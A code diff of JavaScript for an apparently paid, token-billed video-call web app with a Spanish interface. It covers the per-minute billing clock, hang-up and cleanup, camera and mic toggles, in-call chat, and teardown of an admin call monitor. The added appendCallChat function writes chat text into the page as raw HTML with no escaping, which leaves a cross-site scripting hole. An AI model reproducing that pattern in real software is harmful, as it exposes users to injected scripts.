-function startCallClock() {
-  if (callClock) return;
-  callClock = setInterval(async () => {
-    callSeconds++;
-    const t = document.getElementById('callTimer');
-    if (t) t.textContent = String(Math.floor(callSeconds / 60)).padStart(2, '0') + ':' + String(callSeconds % 60).padStart(2, '0');
-    const minutes = Math.floor(callSeconds / 60);
-    if (!iAmClientFlag) { const earned = (callRate * minutes).toFixed(2); const c = document.getElementById('callCost'); if (c) c.textContent = '+' + earned + ' ◈'; }
-    if (iAmClientFlag && callRate > 0 && callSeconds % 60 === 0 && callRowId) {
-      const { data: nb, error } = await db.rpc('pay_call_minute', { p_call: callRowId });
-      if (error || nb === -1 || (nb !== null && nb <= 0)) { showToast('❌ Necesitas más tokens para llamar o continuar la llamada'); endWebCall(); return; }
-      callCostTotal += callRate;
-      currentProfile.tokens_balance = nb; updateHeader();
-    }
-  }, 1000);
+function stopAdminMonitor(keepModal) {
+  if (monChannel) { try { monChannel.send({ type: 'broadcast', event: 'signal', payload: { from: currentUser.id, type: 'bye-monitor' } }); } catch (e) {} try { db.removeChannel(monChannel); } catch (e) {} monChannel = null; }
+  Object.values(monPcs).forEach(p => { try { p.close(); } catch (e) {} }); monPcs = {};
+  if (!keepModal) closeModal('amModal');
 }
 
-async function endWebCall() {
-  stopRing();
-  if (callChannel) { try { callChannel.send({ type: 'broadcast', event: 'hangup', payload: { from: currentUser.id } }); } catch (e) {} }
-  if (callRowId) await db.from('video_calls').update({ status: 'ended', ended_at: new Date().toISOString() }).eq('id', callRowId);
-  cleanupCall();
-}
-function cleanupCall() {
-  stopRing();
-  if (callClock) { clearInterval(callClock); callClock = null; }
-  if (watchdog) { clearInterval(watchdog); watchdog = null; }
-  clearHello(); clearAck(); clearOffer();
-  teardownPC();
-  if (localStream) { localStream.getTracks().forEach(t => t.stop()); localStream = null; }
-  if (callChannel) { try { db.removeChannel(callChannel); } catch (e) {} callChannel = null; }
-  callRoom = null; callRowId = null; callSetupDone = false;
-  showNetHint(false);
-  closeModal('modal-call');
-}
+async function flipCamera() { if (!localStream || !pc) return; let cams = []; try { cams = (await navigator.mediaDevices.enumerateDevices()).filter(d => d.kind === 'videoinput'); } catch (e) {} if (cams.length < 2) { showToast('❌ Una sola cámara'); return; } facingMode = facingMode === 'user' ? 'environment' : 'user'; const others = cams.filter(c => c.deviceId !== currentDeviceId); let ns = null; for (const c of others) { try { ns = await navigator.mediaDevices.getUserMedia({ video: { deviceId: { exact: c.deviceId } }, audio: false }); break; } catch (e) {} } if (!ns) { try { ns = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: facingMode } }, audio: false }); } catch (e) {} } if (!ns) { try { ns = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facingMode }, audio: false }); } catch (e) {} } if (!ns) { showToast('❌ No se pudo; usa ⚙️'); return; } const nt = ns.getVideoTracks()[0]; const nid = nt.getSettings?.().deviceId || null; if (nid && nid === currentDeviceId) { showToast('❌ No cambió; usa ⚙️'); return; } applyVideoTrack(nt); showToast(facingMode === 'environment' ? '🔄 Trasera' : '🔄 Frontal'); }
+function toggleMic() { const t = localStream?.getAudioTracks()[0]; if (!t) return; micOn = !micOn; t.enabled = micOn; const b = document.getElementById('btnMic'); if (b) { b.textContent = micOn ? '🎤 Silenciar' : '🔇 Silenciado'; b.classList.toggle('off', !micOn); } showToast(micOn ? '🎤 Te escuchan' : '🔇 Silenciado'); }
+function toggleCam() { const t = localStream?.getVideoTracks()[0]; if (!t) return; camOn = !camOn; t.enabled = camOn; const lv = document.getElementById('localVideo'); if (lv) lv.classList.toggle('camoff', !camOn); const b = document.getElementById('btnCam'); if (b) { b.textContent = camOn ? '📷 Encendida' : '🚫 Apagada'; b.classList.toggle('off', !camOn); } showToast(camOn ? '📷 Encendida' : '🚫 Apagada'); }
+function appendCallChat(t, mine) { const l = document.getElementById('callChatList'); if (!l) return; l.insertAdjacentHTML('beforeend', `<div class="cc ${mine ? 'me' : 'them'}">${t}</div>`); l.scrollTop = l.scrollHeight; }
+function sendCallChat() { const i = document.getElementById('callChatInput'); if (!i) return; const t = i.value.trim(); if (!t || !callChannel) return; i.value = ''; appendCallChat(t, true); callChannel.send({ type: 'broadcast', event: 'chatmsg', payload: { from: currentUser.id, text: t } }); }
+function startCallClock() { if (callClock) return; callClock = setInterval(async () => { callSeconds++; const t = document.getElementById('callTimer'); if (t) t.textContent = String(Math.floor(callSeconds / 60)).padStart(2, '0') + ':' + String(callSeconds % 60).padStart(2, '0'); const min = Math.floor(callSeconds / 60); if (!iAmClientFlag) { const e = (callRate * min).toFixed(2); const c = document.getElementById('callCost'); if (c) c.textContent = '+' + e + ' ◈'; } if (iAmClientFlag && callRate > 0 && callSeconds % 60 === 0 && callRowId) { const { data: nb, error } = await db.rpc('pay_call_minute', { p_call: callRowId }); if (error || nb === -1 || (nb !== null && nb <= 0)) { showToast('❌ Necesitas más tokens para continuar'); endWebCall(); return; } callCostTotal += callRate; currentProfile.tokens_balance = nb; updateHeader(); } }, 1000); }
+async function endWebCall() { stopRing(); if (callChannel) { try { callChannel.send({ type: 'broadcast', event: 'hangup', payload: { from: currentUser.id } }); } catch (e) {} } if (monPc) { monPc.close(); monPc = null; } if (callRowId) await db.from('video_calls').update({ status: 'ended', ended_at: new Date().toISOString() }).eq('id', callRowId); cleanupCall(); }
+function cleanupCall() { stopRing(); if (callClock) { clearInterval(callClock); callClock = null; } if (watchdog) { clearInterval(watchdog); watchdog = null; } clearHello(); clearAck(); clearOffer(); teardownPC(); if (localStream) { localStream.getTracks().forEach(t => t.stop()); localStream = null; } if (callChannel) { try { db.removeChannel(callChannel); } catch (e) {} callChannel = null; } callRoom = null; callRowId = null; callSetupDone = false; showNetHint(false); closeModal('modal-call'); }
